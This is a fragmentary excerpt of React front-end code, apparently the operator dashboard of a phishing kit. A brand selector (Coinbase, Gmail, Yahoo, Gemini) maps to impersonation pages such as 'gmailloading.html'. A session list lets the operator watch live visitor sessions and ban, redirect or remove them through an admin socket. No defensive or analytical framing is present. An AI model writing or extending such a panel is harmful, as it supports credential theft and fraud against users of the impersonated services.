...
const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selectedBrand = 'Coinbase' }) => {
  const brandPages = {
    ...
    Gmail: {
      Main: [
        { id: 'gmailloading.html', name: 'Loading' }
      ]
    }
  };
...
const SessionList = () => {
  ...
  const { sessions, banIP, redirectUser, removeSession, settings, updateSettings } = useAdminSocket();
  const [isHovered, setIsHovered] = useState(false);
  ...
  useEffect(() => {
    ...
    // Update server settings with selected brand
    if (updateSettings) {
      updateSettings({ selectedBrand });
    }
  }, [selectedBrand, updateSettings]);
            ...
            <div className="relative flex items-center justify-between">
              ...
              <div className="relative flex items-center space-x-2">
                ...
                >
                  ...
                  <option value="Yahoo" className="bg-[#1A1A1A]">Yahoo</option>
                  <option value="Gemini" className="bg-[#1A1A1A]">Gemini</option>
                  <option value="Gmail" className="bg-[#1A1A1A]">Gmail</option>
                </select>
              </div>
            </div>
          </div>
